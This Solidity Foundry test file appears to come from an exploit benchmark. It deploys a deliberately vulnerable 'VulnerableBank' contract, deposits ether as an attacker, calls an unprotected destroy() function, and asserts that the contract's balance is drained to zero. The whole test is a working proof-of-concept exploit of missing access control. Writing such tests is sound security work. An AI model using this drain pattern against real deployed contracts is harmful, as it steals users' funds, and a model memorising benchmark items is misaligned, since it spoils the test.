// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Import necessary libraries from basetest.sol
import "./basetest.sol";
// Import target contract
import "../src/f786f50c-f847-4c8e-bed3-41049160b00d_VulnerableBank.sol";

contract TestVulnerableBank is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        // Deploy the VulnerableBank contract
        target = new VulnerableBank();
        // Log initial balances for verification
        balanceLog.log("Initial Balance", address(target).balance);
    }

    function testExploit() public {
        uint256 depositAmount = 1 ether;
        // Attacker deposits Ether into the contract
        vm.deal(address(this), depositAmount * 2);
        target.deposit{value: depositAmount}();

        // Log attacker's balance before exploit
        balanceLog.log("Attacker Balance Before Exploit", address(this).balance);

        // Call destroy() function from the attacker
        vm.prank(address(this));
        target.destroy();

        // Log contract and attacker balances after exploit
        balanceLog.log("Contract Balance After Exploit", address(target).balance);
        balanceLog.log("Attacker Balance After Exploit", address(this).balance);

        // Assert that all Ether has been drained from the contract
        assertEq(address(target).balance, 0);
    }
}